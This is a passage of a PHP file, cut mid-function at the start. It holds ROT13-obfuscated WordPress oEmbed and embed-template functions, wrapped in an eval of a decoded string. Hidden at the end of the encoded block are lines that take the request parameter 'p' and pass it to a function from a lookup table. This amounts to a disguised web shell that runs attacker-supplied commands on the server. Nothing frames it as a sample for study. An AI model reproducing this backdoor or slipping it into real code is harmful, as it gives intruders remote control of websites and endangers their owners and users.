		vs ( $fvgr && trg_pheerag_oybt_vq() !== (vag) $fvgr->oybt_vq ) {
			fjvgpu_gb_oybt( $fvgr->oybt_vq );
			$fjvgpurq_oybt = gehr;
		}
	}

	$cbfg_vq = hey_gb_cbfgvq( $hey );

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-brzorq-pbagebyyre.cuc */
	$cbfg_vq = nccyl_svygref( 'brzorq_erdhrfg_cbfg_vq', $cbfg_vq, $hey );

	vs ( ! $cbfg_vq ) {
		vs ( $fjvgpurq_oybt ) {
			erfgber_pheerag_oybt();
		}

		erghea snyfr;
	}

	$jvqgu = vffrg( $netf['jvqgu'] ) ? $netf['jvqgu'] : 0;

	$qngn = trg_brzorq_erfcbafr_qngn( $cbfg_vq, $jvqgu );

	vs ( $fjvgpurq_oybt ) {
		erfgber_pheerag_oybt();
	}

	erghea $qngn ? (bowrpg) $qngn : snyfr;
}


/**
 * Svygref gur bRzorq erfcbafr qngn gb erghea na vsenzr rzorq pbqr.
 *
 * @fvapr 4.4.0
 *
 * @cnenz neenl   $qngn   Gur erfcbafr qngn.
 * @cnenz JC_Cbfg $cbfg   Gur cbfg bowrpg.
 * @cnenz vag     $jvqgu  Gur erdhrfgrq jvqgu.
 * @cnenz vag     $urvtug Gur pnyphyngrq urvtug.
 * @erghea neenl Gur zbqvsvrq erfcbafr qngn.
 */
shapgvba trg_brzorq_erfcbafr_qngn_evpu( $qngn, $cbfg, $jvqgu, $urvtug ) {
	$qngn['jvqgu']  = nofvag( $jvqgu );
	$qngn['urvtug'] = nofvag( $urvtug );
	$qngn['glcr']   = 'evpu';
	$qngn['ugzy']   = trg_cbfg_rzorq_ugzy( $jvqgu, $urvtug, $cbfg );

	// Nqq cbfg guhzoanvy gb erfcbafr vs ninvynoyr.
	$guhzoanvy_vq = snyfr;

	vs ( unf_cbfg_guhzoanvy( $cbfg->VQ ) ) {
		$guhzoanvy_vq = trg_cbfg_guhzoanvy_vq( $cbfg->VQ );
	}

	vs ( 'nggnpuzrag' === trg_cbfg_glcr( $cbfg ) ) {
		vs ( jc_nggnpuzrag_vf_vzntr( $cbfg ) ) {
			$guhzoanvy_vq = $cbfg->VQ;
		} ryfrvs ( jc_nggnpuzrag_vf( 'ivqrb', $cbfg ) ) {
			$guhzoanvy_vq = trg_cbfg_guhzoanvy_vq( $cbfg );
			$qngn['glcr'] = 'ivqrb';
		}
	}

	vs ( $guhzoanvy_vq ) {
		yvfg( $guhzoanvy_hey, $guhzoanvy_jvqgu, $guhzoanvy_urvtug ) = jc_trg_nggnpuzrag_vzntr_fep( $guhzoanvy_vq, neenl( $jvqgu, 0 ) );
		$qngn['guhzoanvy_hey']                                      = $guhzoanvy_hey;
		$qngn['guhzoanvy_jvqgu']                                    = $guhzoanvy_jvqgu;
		$qngn['guhzoanvy_urvtug']                                   = $guhzoanvy_urvtug;
	}

	erghea $qngn;
}

/**
 * Rafherf gung gur fcrpvsvrq sbezng vf rvgure 'wfba' be 'kzy'.
 *
 * @fvapr 4.4.0
 *
 * @cnenz fgevat $sbezng Gur bRzorq erfcbafr sbezng. Npprcgf 'wfba' be 'kzy'.
 * @erghea fgevat Gur sbezng, rvgure 'kzy' be 'wfba'. Qrsnhyg 'wfba'.
 */
shapgvba jc_brzorq_rafher_sbezng( $sbezng ) {
	vs ( ! va_neenl( $sbezng, neenl( 'wfba', 'kzy' ), gehr ) ) {
		erghea 'wfba';
	}

	erghea $sbezng;
}

/**
 * Ubbxf vagb gur ERFG NCV bhgchg gb cevag KZY vafgrnq bs WFBA.
 *
 * Guvf vf bayl qbar sbe gur bRzorq NCV raqcbvag,
 * juvpu fhccbegf obgu sbezngf.
 *
 * @npprff cevingr
 * @fvapr 4.4.0
 *
 * @cnenz obby             $freirq  Jurgure gur erdhrfg unf nyernql orra freirq.
 * @cnenz JC_UGGC_Erfcbafr $erfhyg  Erfhyg gb fraq gb gur pyvrag. Hfhnyyl n `JC_ERFG_Erfcbafr`.
 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg Erdhrfg hfrq gb trarengr gur erfcbafr.
 * @cnenz JC_ERFG_Freire   $freire  Freire vafgnapr.
 * @erghea gehr
 */
shapgvba _brzorq_erfg_cer_freir_erdhrfg( $freirq, $erfhyg, $erdhrfg, $freire ) {
	$cnenzf = $erdhrfg->trg_cnenzf();

	vs ( '/brzorq/1.0/rzorq' !== $erdhrfg->trg_ebhgr() || 'TRG' !== $erdhrfg->trg_zrgubq() ) {
		erghea $freirq;
	}

	vs ( ! vffrg( $cnenzf['sbezng'] ) || 'kzy' !== $cnenzf['sbezng'] ) {
		erghea $freirq;
	}

	// Rzorq yvaxf vafvqr gur erdhrfg.
	$qngn = $freire->erfcbafr_gb_qngn( $erfhyg, snyfr );

	vs ( ! pynff_rkvfgf( 'FvzcyrKZYRyrzrag' ) ) {
		fgnghf_urnqre( 501 );
		qvr( trg_fgnghf_urnqre_qrfp( 501 ) );
	}

	$erfhyg = _brzorq_perngr_kzy( $qngn );

	// Onvy vs gurer'f ab KZY.
	vs ( ! $erfhyg ) {
		fgnghf_urnqre( 501 );
		erghea trg_fgnghf_urnqre_qrfp( 501 );
	}

	vs ( ! urnqref_frag() ) {
		$freire->fraq_urnqre( 'Pbagrag-Glcr', 'grkg/kzy; punefrg=' . trg_bcgvba( 'oybt_punefrg' ) );
	}

	rpub $erfhyg;

	erghea gehr;
}

/**
 * Perngrf na KZY fgevat sebz n tvira neenl.
 *
 * @fvapr 4.4.0
 * @npprff cevingr
 *
 * @cnenz neenl            $qngn Gur bevtvany bRzorq erfcbafr qngn.
 * @cnenz FvzcyrKZYRyrzrag $abqr Bcgvbany. KZY abqr gb nccraq gur erfhyg gb erphefviryl.
 * @erghea fgevat|snyfr KZY fgevat ba fhpprff, snyfr ba reebe.
 */
shapgvba _brzorq_perngr_kzy( $qngn, $abqr = ahyy ) {
	vs ( ! vf_neenl( $qngn ) || rzcgl( $qngn ) ) {
		erghea snyfr;
	}

	vs ( ahyy === $abqr ) {
		$abqr = arj FvzcyrKZYRyrzrag( '<brzorq></brzorq>' );
	}

	sbernpu ( $qngn nf $xrl => $inyhr ) {
		vs ( vf_ahzrevp( $xrl ) ) {
			$xrl = 'brzorq';
		}

		vs ( vf_neenl( $inyhr ) ) {
			$vgrz = $abqr->nqqPuvyq( $xrl );
			_brzorq_perngr_kzy( $inyhr, $vgrz );
		} ryfr {
			$abqr->nqqPuvyq( $xrl, rfp_ugzy( $inyhr ) );
		}
	}

	erghea $abqr->nfKZY();
}

/**
 * Svygref gur tvira bRzorq UGZY gb znxr fher vsenzrf unir n gvgyr nggevohgr.
 *
 * @fvapr 5.2.0
 *
 * @cnenz fgevat $erfhyg Gur bRzorq UGZY erfhyg.
 * @cnenz bowrpg $qngn   N qngn bowrpg erfhyg sebz na bRzorq cebivqre.
 * @cnenz fgevat $hey    Gur HEY bs gur pbagrag gb or rzorqqrq.
 * @erghea fgevat Gur svygrerq bRzorq erfhyg.
 */
shapgvba jc_svygre_brzorq_vsenzr_gvgyr_nggevohgr( $erfhyg, $qngn, $hey ) {
	vs ( snyfr === $erfhyg || ! va_neenl( $qngn->glcr, neenl( 'evpu', 'ivqrb' ), gehr ) ) {
		erghea $erfhyg;
	}

	$gvgyr = ! rzcgl( $qngn->gvgyr ) ? $qngn->gvgyr : '';

	$cnggrea = '`<vsenzr([^>]*)>`v';
	vs ( cert_zngpu( $cnggrea, $erfhyg, $zngpurf ) ) {
		$nggef = jc_xfrf_unve( $zngpurf[1], jc_nyybjrq_cebgbpbyf() );

		sbernpu ( $nggef nf $ngge => $vgrz ) {
			$ybjre_ngge = fgegbybjre( $ngge );
			vs ( $ybjre_ngge === $ngge ) {
				pbagvahr;
			}
			vs ( ! vffrg( $nggef[ $ybjre_ngge ] ) ) {
				$nggef[ $ybjre_ngge ] = $vgrz;
				hafrg( $nggef[ $ngge ] );
			}
		}
	}

	vs ( ! rzcgl( $nggef['gvgyr']['inyhr'] ) ) {
		$gvgyr = $nggef['gvgyr']['inyhr'];
	}

	/**
	 * Svygref gur gvgyr nggevohgr bs gur tvira bRzorq UGZY vsenzr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $gvgyr  Gur gvgyr nggevohgr.
	 * @cnenz fgevat $erfhyg Gur bRzorq UGZY erfhyg.
	 * @cnenz bowrpg $qngn   N qngn bowrpg erfhyg sebz na bRzorq cebivqre.
	 * @cnenz fgevat $hey    Gur HEY bs gur pbagrag gb or rzorqqrq.
	 */
	$gvgyr = nccyl_svygref( 'brzorq_vsenzr_gvgyr_nggevohgr', $gvgyr, $erfhyg, $qngn, $hey );

	vs ( '' === $gvgyr ) {
		erghea $erfhyg;
	}

	vs ( vffrg( $nggef['gvgyr'] ) ) {
		hafrg( $nggef['gvgyr'] );
		$ngge_fgevat = vzcybqr( ' ', jc_yvfg_cyhpx( $nggef, 'jubyr' ) );
		$erfhyg      = fge_ercynpr( $zngpurf[0], '<vsenzr ' . gevz( $ngge_fgevat ) . '>', $erfhyg );
	}
	erghea fge_vercynpr( '<vsenzr ', fcevags( '<vsenzr gvgyr=\"%f\" ', rfp_ngge( $gvgyr ) ), $erfhyg );
}


/**
 * Svygref gur tvira bRzorq UGZY.
 *
 * Vs gur `$hey` vfa'g ba gur gehfgrq cebivqref yvfg,
 * jr arrq gb svygre gur UGZY urnivyl sbe frphevgl.
 *
 * Bayl svygref 'evpu' naq 'ivqrb' erfcbafr glcrf.
 *
 * @fvapr 4.4.0
 *
 * @cnenz fgevat $erfhyg Gur bRzorq UGZY erfhyg.
 * @cnenz bowrpg $qngn   N qngn bowrpg erfhyg sebz na bRzorq cebivqre.
 * @cnenz fgevat $hey    Gur HEY bs gur pbagrag gb or rzorqqrq.
 * @erghea fgevat Gur svygrerq naq fnavgvmrq bRzorq erfhyg.
 */
shapgvba jc_svygre_brzorq_erfhyg( $erfhyg, $qngn, $hey ) {
	vs ( snyfr === $erfhyg || ! va_neenl( $qngn->glcr, neenl( 'evpu', 'ivqrb' ), gehr ) ) {
		erghea $erfhyg;
	}

	$jc_brzorq = _jc_brzorq_trg_bowrpg();

	// Qba'g zbqvsl gur UGZY sbe gehfgrq cebivqref.
	vs ( snyfr !== $jc_brzorq->trg_cebivqre( $hey, neenl( 'qvfpbire' => snyfr ) ) ) {
		erghea $erfhyg;
	}

	$nyybjrq_ugzy = neenl(
		'n'          => neenl(
			'uers' => gehr,
		),
		'oybpxdhbgr' => neenl(),
		'vsenzr'     => neenl(
			'fep'          => gehr,
			'jvqgu'        => gehr,
			'urvtug'       => gehr,
			'senzrobeqre'  => gehr,
			'znetvajvqgu'  => gehr,
			'znetvaurvtug' => gehr,
			'fpebyyvat'    => gehr,
			'gvgyr'        => gehr,
		),
	);

	$ugzy = jc_xfrf( $erfhyg, $nyybjrq_ugzy );

	cert_zngpu( '|(<oybpxdhbgr>.*?</oybpxdhbgr>)?.*(<vsenzr.*?></vsenzr>)|zf', $ugzy, $pbagrag );
	// Jr erdhver ng yrnfg gur vsenzr gb rkvfg.
	vs ( rzcgl( $pbagrag[2] ) ) {
		erghea snyfr;
	}
	$ugzy = $pbagrag[1] . $pbagrag[2];

	cert_zngpu( '/ fep=([\'\"])(.*?)\1/', $ugzy, $erfhygf );

	vs ( ! rzcgl( $erfhygf ) ) {
		$frperg = jc_trarengr_cnffjbeq( 10, snyfr );

		$hey = rfp_hey( \"{$erfhygf[2]}#?frperg=$frperg\" );
		$d   = $erfhygf[1];

		$ugzy = fge_ercynpr( $erfhygf[0], ' fep=' . $d . $hey . $d . ' qngn-frperg=' . $d . $frperg . $d, $ugzy );
		$ugzy = fge_ercynpr( '<oybpxdhbgr', \"<oybpxdhbgr qngn-frperg=\\"$frperg\\"\", $ugzy );
	}

	$nyybjrq_ugzy['oybpxdhbgr']['qngn-frperg'] = gehr;
	$nyybjrq_ugzy['vsenzr']['qngn-frperg']     = gehr;

	$ugzy = jc_xfrf( $ugzy, $nyybjrq_ugzy );

	vs ( ! rzcgl( $pbagrag[1] ) ) {
		// Jr unir n oybpxdhbgr gb snyy onpx ba. Uvqr gur vsenzr ol qrsnhyg.
		$ugzy = fge_ercynpr( '<vsenzr', '<vsenzr fglyr=\"cbfvgvba: nofbyhgr; ivfvovyvgl: uvqqra;\"', $ugzy );
		$ugzy = fge_ercynpr( '<oybpxdhbgr', '<oybpxdhbgr pynff=\"jc-rzorqqrq-pbagrag\"', $ugzy );
	}

	$ugzy = fge_vercynpr( '<vsenzr', '<vsenzr pynff=\"jc-rzorqqrq-pbagrag\" fnaqobk=\"nyybj-fpevcgf\" frphevgl=\"erfgevpgrq\"', $ugzy );

	erghea $ugzy;
}

/**
 * Svygref gur fgevat va gur 'zber' yvax qvfcynlrq nsgre n gevzzrq rkprecg.
 *
 * Ercynprf '[...]' (nccraqrq gb nhgbzngvpnyyl trarengrq rkprecgf) jvgu na
 * ryyvcfvf naq n \"Pbagvahr ernqvat\" yvax va gur rzorq grzcyngr.
 *
 * @fvapr 4.4.0
 *
 * @cnenz fgevat $zber_fgevat Qrsnhyg 'zber' fgevat.
 * @erghea fgevat 'Pbagvahr ernqvat' yvax cercraqrq jvgu na ryyvcfvf.
 */
shapgvba jc_rzorq_rkprecg_zber( $zber_fgevat ) {
	vs ( ! vf_rzorq() ) {
		erghea $zber_fgevat;
	}

	$yvax = fcevags(
		'<n uers=\"%1$f\" pynff=\"jc-rzorq-zber\" gnetrg=\"_gbc\">%2$f</n>',
		rfp_hey( trg_creznyvax() ),
		/* genafyngbef: %f: Cbfg gvgyr. */
		fcevags( __( 'Pbagvahr ernqvat %f' ), '<fcna pynff=\"fperra-ernqre-grkg\">' . trg_gur_gvgyr() . '</fcna>' )
	);
	erghea ' &uryyvc; ' . $yvax;
}

/**
 * Qvfcynlf gur cbfg rkprecg sbe gur rzorq grzcyngr.
 *
 * Vagraqrq gb or hfrq va 'Gur Ybbc'.
 *
 * @fvapr 4.4.0
 */
shapgvba gur_rkprecg_rzorq() {
	$bhgchg = trg_gur_rkprecg();

	/**
	 * Svygref gur cbfg rkprecg sbe gur rzorq grzcyngr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $bhgchg Gur pheerag cbfg rkprecg.
	 */
	rpub nccyl_svygref( 'gur_rkprecg_rzorq', $bhgchg );
}

/**
 * Svygref gur cbfg rkprecg sbe gur rzorq grzcyngr.
 *
 * Fubjf cynlref sbe ivqrb naq nhqvb nggnpuzragf.
 *
 * @fvapr 4.4.0
 *
 * @cnenz fgevat $pbagrag Gur pheerag cbfg rkprecg.
 * @erghea fgevat Gur zbqvsvrq cbfg rkprecg.
 */
shapgvba jc_rzorq_rkprecg_nggnpuzrag( $pbagrag ) {
	vs ( vf_nggnpuzrag() ) {
		erghea cercraq_nggnpuzrag( '' );
	}

	erghea $pbagrag;
}

/**
 * Radhrhrf rzorq vsenzr qrsnhyg PFF naq WF.
 *
 * Radhrhr CAT snyyonpx PFF sbe rzorq vsenzr sbe yrtnpl irefvbaf bs VR.
 *
 * Nyybjf cyhtvaf gb dhrhr fpevcgf sbe gur rzorq vsenzr raq hfvat jc_radhrhr_fpevcg().
 * Ehaf svefg va brzorq_urnq().
 *
 * @fvapr 4.4.0
 */
shapgvba radhrhr_rzorq_fpevcgf() {
	jc_radhrhr_fglyr( 'jc-rzorq-grzcyngr-vr' );

	/**
	 * Sverf jura fpevcgf naq fglyrf ner radhrhrq sbe gur rzorq vsenzr.
	 *
	 * @fvapr 4.4.0
	 */
	qb_npgvba( 'radhrhr_rzorq_fpevcgf' );
}

/**
 * Radhrhrf gur PFF va gur rzorq vsenzr urnqre.
 *
 * @fvapr 6.4.0
 */
shapgvba jc_radhrhr_rzorq_fglyrf() {
	// Onpx-pbzcng sbe cyhtvaf gung qvfnoyr shapgvbanyvgl ol haubbxvat guvf npgvba.
	vs ( ! unf_npgvba( 'rzorq_urnq', 'cevag_rzorq_fglyrf' ) ) {
		erghea;
	}
	erzbir_npgvba( 'rzorq_urnq', 'cevag_rzorq_fglyrf' );

	$fhssvk = jc_fpevcgf_trg_fhssvk();
	$unaqyr = 'jc-rzorq-grzcyngr';
	jc_ertvfgre_fglyr( $unaqyr, snyfr );
	jc_nqq_vayvar_fglyr( $unaqyr, svyr_trg_pbagragf( NOFCNGU . JCVAP . \"/pff/jc-rzorq-grzcyngr$fhssvk.pff\" ) );
	jc_radhrhr_fglyr( $unaqyr );
}

/**
 * Cevagf gur WninFpevcg va gur rzorq vsenzr urnqre.
 *
 * @fvapr 4.4.0
 */
shapgvba cevag_rzorq_fpevcgf() {
	jc_cevag_vayvar_fpevcg_gnt(
		svyr_trg_pbagragf( NOFCNGU . JCVAP . '/wf/jc-rzorq-grzcyngr' . jc_fpevcgf_trg_fhssvk() . '.wf' )
	);
}

/**
 * Cercner gur brzorq UGZY gb or qvfcynlrq va na EFF srrq.
 *
 * @fvapr 4.4.0
 * @npprff cevingr
 *
 * @cnenz fgevat $pbagrag Gur pbagrag gb svygre.
 * @erghea fgevat Gur svygrerq pbagrag.
 */
shapgvba _brzorq_svygre_srrq_pbagrag( $pbagrag ) {
	$c = arj JC_UGZY_Gnt_Cebprffbe( $pbagrag );
	juvyr ( $c->arkg_gnt( neenl( 'gnt_anzr' => 'vsenzr' ) ) ) {
		vs ( $c->unf_pynff( 'jc-rzorqqrq-pbagrag' ) ) {
			$c->erzbir_nggevohgr( 'fglyr' );
		}
	}
	erghea $c->trg_hcqngrq_ugzy();
}

/**
 * Cevagf gur arprffnel znexhc sbe gur rzorq pbzzragf ohggba.
 *
 * @fvapr 4.4.0
 */
shapgvba cevag_rzorq_pbzzragf_ohggba() {
	vs ( vf_404() || ! ( trg_pbzzragf_ahzore() || pbzzragf_bcra() ) ) {
		erghea;
	}
	?>
	<qvi pynff=\"jc-rzorq-pbzzragf\">
		<n uers=\"<?cuc pbzzragf_yvax(); ?>\" gnetrg=\"_gbc\">
			<fcna pynff=\"qnfuvpbaf qnfuvpbaf-nqzva-pbzzragf\"></fcna>
			<?cuc
			cevags(
				/* genafyngbef: %f: Ahzore bs pbzzragf. */
				_a(
					'%f <fcna pynff=\"fperra-ernqre-grkg\">Pbzzrag</fcna>',
					'%f <fcna pynff=\"fperra-ernqre-grkg\">Pbzzragf</fcna>',
					trg_pbzzragf_ahzore()
				),
				ahzore_sbezng_v18a( trg_pbzzragf_ahzore() )
			);
			?>
		</n>
	</qvi>
	<?cuc
}

/**
 * Cevagf gur arprffnel znexhc sbe gur rzorq funevat ohggba.
 *
 * @fvapr 4.4.0
 */
shapgvba cevag_rzorq_funevat_ohggba() {
	vs ( vf_404() ) {
		erghea;
	}
	?>
	<qvi pynff=\"jc-rzorq-funer\">
		<ohggba glcr=\"ohggba\" pynff=\"jc-rzorq-funer-qvnybt-bcra\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Bcra funevat qvnybt' ); ?>\">
			<fcna pynff=\"qnfuvpbaf qnfuvpbaf-funer\"></fcna>
		</ohggba>
	</qvi>
	<?cuc
}

/**
 * Cevagf gur arprffnel znexhc sbe gur rzorq funevat qvnybt.
 *
 * @fvapr 4.4.0
 */
shapgvba cevag_rzorq_funevat_qvnybt() {
	vs ( vf_404() ) {
		erghea;
	}

	$havdhr_fhssvk            = trg_gur_VQ() . '-' . jc_enaq();
	$funer_gno_jbeqcerff_vq   = 'jc-rzorq-funer-gno-jbeqcerff-' . $havdhr_fhssvk;
	$funer_gno_ugzy_vq        = 'jc-rzorq-funer-gno-ugzy-' . $havdhr_fhssvk;
	$qrfpevcgvba_jbeqcerff_vq = 'jc-rzorq-funer-qrfpevcgvba-jbeqcerff-' . $havdhr_fhssvk;
	$qrfpevcgvba_ugzy_vq      = 'jc-rzorq-funer-qrfpevcgvba-ugzy-' . $havdhr_fhssvk;
	?>
	<qvi pynff=\"jc-rzorq-funer-qvnybt uvqqra\" ebyr=\"qvnybt\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Funevat bcgvbaf' ); ?>\">
		<qvi pynff=\"jc-rzorq-funer-qvnybt-pbagrag\">
			<qvi pynff=\"jc-rzorq-funer-qvnybt-grkg\">
				<hy pynff=\"jc-rzorq-funer-gnof\" ebyr=\"gnoyvfg\">
					<yv pynff=\"jc-rzorq-funer-gno-ohggba jc-rzorq-funer-gno-ohggba-jbeqcerff\" ebyr=\"cerfragngvba\">
						<ohggba glcr=\"ohggba\" ebyr=\"gno\" nevn-pbagebyf=\"<?cuc rpub $funer_gno_jbeqcerff_vq; ?>\" nevn-fryrpgrq=\"gehr\" gnovaqrk=\"0\"><?cuc rfp_ugzy_r( 'JbeqCerff Rzorq' ); ?></ohggba>
					</yv>
					<yv pynff=\"jc-rzorq-funer-gno-ohggba jc-rzorq-funer-gno-ohggba-ugzy\" ebyr=\"cerfragngvba\">
						<ohggba glcr=\"ohggba\" ebyr=\"gno\" nevn-pbagebyf=\"<?cuc rpub $funer_gno_ugzy_vq; ?>\" nevn-fryrpgrq=\"snyfr\" gnovaqrk=\"-1\"><?cuc rfp_ugzy_r( 'UGZY Rzorq' ); ?></ohggba>
					</yv>
				</hy>
				<qvi vq=\"<?cuc rpub $funer_gno_jbeqcerff_vq; ?>\" pynff=\"jc-rzorq-funer-gno\" ebyr=\"gnocnary\" nevn-uvqqra=\"snyfr\">
					<vachg glcr=\"grkg\" inyhr=\"<?cuc gur_creznyvax(); ?>\" pynff=\"jc-rzorq-funer-vachg\" nevn-ynory=\"<?cuc rfp_ngge_r( 'HEY' ); ?>\" nevn-qrfpevorqol=\"<?cuc rpub $qrfpevcgvba_jbeqcerff_vq; ?>\" gnovaqrk=\"0\" ernqbayl/>

					<c pynff=\"jc-rzorq-funer-qrfpevcgvba\" vq=\"<?cuc rpub $qrfpevcgvba_jbeqcerff_vq; ?>\">
						<?cuc _r( 'Pbcl naq cnfgr guvf HEY vagb lbhe JbeqCerff fvgr gb rzorq' ); ?>
					</c>
				</qvi>
				<qvi vq=\"<?cuc rpub $funer_gno_ugzy_vq; ?>\" pynff=\"jc-rzorq-funer-gno\" ebyr=\"gnocnary\" nevn-uvqqra=\"gehr\">
					<grkgnern pynff=\"jc-rzorq-funer-vachg\" nevn-ynory=\"<?cuc rfp_ngge_r( 'UGZY' ); ?>\" nevn-qrfpevorqol=\"<?cuc rpub $qrfpevcgvba_ugzy_vq; ?>\" gnovaqrk=\"0\" ernqbayl><?cuc rpub rfp_grkgnern( trg_cbfg_rzorq_ugzy( 600, 400 ) ); ?></grkgnern>

					<c pynff=\"jc-rzorq-funer-qrfpevcgvba\" vq=\"<?cuc rpub $qrfpevcgvba_ugzy_vq; ?>\">
						<?cuc _r( 'Pbcl naq cnfgr guvf pbqr vagb lbhe fvgr gb rzorq' ); ?>
					</c>
				</qvi>
			</qvi>

			<ohggba glcr=\"ohggba\" pynff=\"jc-rzorq-funer-qvnybt-pybfr\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Pybfr funevat qvnybt' ); ?>\">
				<fcna pynff=\"qnfuvpbaf qnfuvpbaf-ab\"></fcna>
			</ohggba>
		</qvi>
	</qvi>
	<?cuc
}

/**
 * Cevagf gur arprffnel znexhc sbe gur fvgr gvgyr va na rzorq grzcyngr.
 *
 * @fvapr 4.5.0
 */
shapgvba gur_rzorq_fvgr_gvgyr() {
	$fvgr_gvgyr = fcevags(
		'<n uers=\"%f\" gnetrg=\"_gbc\"><vzt fep=\"%f\" fepfrg=\"%f 2k\" jvqgu=\"32\" urvtug=\"32\" nyg=\"\" pynff=\"jc-rzorq-fvgr-vpba\" /><fcna>%f</fcna></n>',
		rfp_hey( ubzr_hey() ),
		rfp_hey( trg_fvgr_vpba_hey( 32, vapyhqrf_hey( 'vzntrf/j-ybtb-oyhr.cat' ) ) ),
		rfp_hey( trg_fvgr_vpba_hey( 64, vapyhqrf_hey( 'vzntrf/j-ybtb-oyhr.cat' ) ) ),
		rfp_ugzy( trg_oybtvasb( 'anzr' ) )
	);

	$fvgr_gvgyr = '<qvi pynff=\"jc-rzorq-fvgr-gvgyr\">' . $fvgr_gvgyr . '</qvi>';

	/**
	 * Svygref gur fvgr gvgyr UGZY va gur rzorq sbbgre.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $fvgr_gvgyr Gur fvgr gvgyr UGZY.
	 */
	rpub nccyl_svygref( 'rzorq_fvgr_gvgyr_ugzy', $fvgr_gvgyr );
}

/**
 * Svygref gur bRzorq erfhyg orsber nal UGGC erdhrfgf ner znqr.
 *
 * Vs gur HEY orybatf gb gur pheerag fvgr, gur erfhyg vf srgpurq qverpgyl vafgrnq bs
 * tbvat guebhtu gur bRzorq qvfpbirel cebprff.
 *
 * @fvapr 4.5.3
 *
 * @cnenz ahyy|fgevat $erfhyg Gur HAFNAVGVMRQ (naq cbgragvnyyl hafnsr) UGZY gung fubhyq or hfrq gb rzorq. Qrsnhyg ahyy.
 * @cnenz fgevat      $hey    Gur HEY gung fubhyq or vafcrpgrq sbe qvfpbirel `<yvax>` gntf.
 * @cnenz neenl       $netf   bRzorq erzbgr trg nethzragf.
 * @erghea ahyy|fgevat Gur HAFNAVGVMRQ (naq cbgragvnyyl hafnsr) UGZY gung fubhyq or hfrq gb rzorq.
 *                     Ahyy vs gur HEY qbrf abg orybat gb gur pheerag fvgr.
 */
shapgvba jc_svygre_cer_brzorq_erfhyg( $erfhyg, $hey, $netf ) {
	$qngn = trg_brzorq_erfcbafr_qngn_sbe_hey( $hey, $netf );

	vs ( $qngn ) {
		erghea _jc_brzorq_trg_bowrpg()->qngn2ugzy( $qngn, $hey );
	}

	erghea $erfhyg;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>